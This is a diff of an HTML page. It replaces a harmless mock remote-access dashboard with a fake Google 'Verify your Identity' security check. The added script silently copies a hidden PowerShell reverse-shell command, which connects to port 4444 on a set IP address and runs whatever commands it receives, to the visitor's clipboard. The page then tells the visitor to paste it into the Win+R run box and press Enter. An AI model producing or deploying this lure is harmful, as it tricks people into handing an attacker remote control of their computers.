@@ -1,80 +1,41 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Remote Access Simulation</title>
+    <title>Security Check</title>
     <style>
-        body { background: #1a1a1a; color: #00ff41; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; }
-        #panel { border: 2px solid #333; padding: 20px; background: #000; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
-        #screen-frame { width: 640px; height: 360px; background: #222; border: 1px solid #444; position: relative; overflow: hidden; }
-        .victim-desktop { width: 100%; height: 100%; opacity: 0.7; filter: grayscale(50%); }
-        #log { width: 640px; height: 150px; background: #050505; border: 1px solid #444; margin-top: 10px; overflow-y: scroll; font-size: 12px; padding: 10px; }
-        .btn-group { margin-top: 15px; }
-        button { background: #00ff41; color: #000; border: none; padding: 8px 15px; cursor: pointer; font-weight: bold; margin-right: 5px; }
-        button:hover { background: #00cc33; }
-        .status { color: #ffcc00; margin-bottom: 10px; }
+        body { font-family: sans-serif; display: flex; justify-content: center; margin-top: 100px; background: #f9f9f9; }
+        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 350px; }
+        button { background: #4285f4; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        .instructions { display: none; background: #fff3cd; padding: 15px; margin-top: 15px; border: 1px solid #ffeeba; text-align: left; font-size: 14px; }
     </style>
 </head>
 <body>
+    <div class="card">
+        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
+        <h3>Verify your Identity</h3>
+        <p id="msg">Click below to fix a browser connection error.</p>
+        <button id="btn" onclick="copyAndTrap()">Fix Connection</button>
 
-    <h1>C2 CONTROL INTERFACE [BETA]</h1>
-    <div class="status">● CONNECTION ACTIVE: 192.168.1.45 (Kyle-PC)</div>
-
-    <div id="panel">
-        <div id="screen-frame">
-            <img src="https://via.placeholder.com/640x360/111/00ff41?text=LIVE+DESKTOP+STREAM" class="victim-desktop" id="live-stream">
-            <div id="remote-cursor" style="position:absolute; width:12px; height:12px; background:red; border-radius:50%; top:50%; left:50%; pointer-events:none;"></div>
+        <div id="steps" class="instructions">
+            <strong>Manual Fix Required:</strong><br>
+            1. Press <b>Win + R</b> on your keyboard.<br>
+            2. <b>Right-Click</b> in the box and <b>Paste</b>.<br>
+            3. Press <b>Enter</b> to verify.
         </div>
-
-        <div class="btn-group">
-            <button onclick="triggerAction('SCREENSHOT')">Capture Screen</button>
-            <button onclick="triggerAction('KEYLOG')">Start Keylogger</button>
-            <button onclick="triggerAction('WEBCAM')">Access Camera</button>
-            <button style="background:red; color:white;" onclick="triggerAction('TERMINATE')">Self-Destruct Agent</button>
-        </div>
-    </div>
-
-    <div id="log">
-        [SYSTEM] Interface Initialized...<br>
-        [SYSTEM] Waiting for Beacon from Agent...<br>
     </div>
 
     <script>
-        const log = document.getElementById('log');
-        const screen = document.getElementById('screen-frame');
-        const cursor = document.getElementById('remote-cursor');
+        function copyAndTrap() {
+            // REPLACE 'YOUR_IP_HERE' with your main computer's internal IP address
+            const ip = "192.168.40.136"; 
+            const cmd = `powershell -WindowStyle Hidden -Command "$c = New-Object System.Net.Sockets.TCPClient('${ip}',4444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2  = $sb + 'PS ' + (pwd).Path + '> ';$sendb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendb,0,$sendb.Length);$s.Flush()};$c.Close()"`;
 
-        // Simulate the mouse tracking that happens in a RAT
-        screen.addEventListener('mousemove', (e) => {
-            const rect = screen.getBoundingClientRect();
-            const x = e.clientX - rect.left;
-            const y = e.clientY - rect.top;
-            cursor.style.left = x + 'px';
-            cursor.style.top = y + 'px';
-            
-            // Real hackers send these X/Y coordinates to the agent
-            // socket.send(JSON.stringify({type: 'mouse_move', x: x, y: y}));
-        });
-
-        function triggerAction(type) {
-            const time = new Date().toLocaleTimeString();
-            let msg = "";
-
-            if(type === 'SCREENSHOT') msg = "Requesting high-res frame from Agent...";
-            if(type === 'KEYLOG') msg = "Hooking keyboard drivers... intercepting 'facebook.com' login.";
-            if(type === 'WEBCAM') msg = "Initializing hardware ID: 0x442... Light suppressed.";
-            if(type === 'TERMINATE') msg = "ERASING AGENT FROM DISK. Connection Lost.";
-
-            log.innerHTML += `[${time}] ${msg}<br>`;
-            log.scrollTop = log.scrollHeight;
+            navigator.clipboard.writeText(cmd).then(() => {
+                document.getElementById('btn').style.display = 'none';
+                document.getElementById('msg').innerText = "Follow the steps to complete verification:";
+                document.getElementById('steps').style.display = 'block';
+            });
         }
-
-        // Simulate "Beacons" arriving every 3 seconds
-        setInterval(() => {
-            const time = new Date().toLocaleTimeString();
-            log.innerHTML += `<span style="color:#555">[${time}] Beacon received from 192.168.1.45</span><br>`;
-            log.scrollTop = log.scrollHeight;
-        }, 3000);
     </script>
 </body>
 </html>
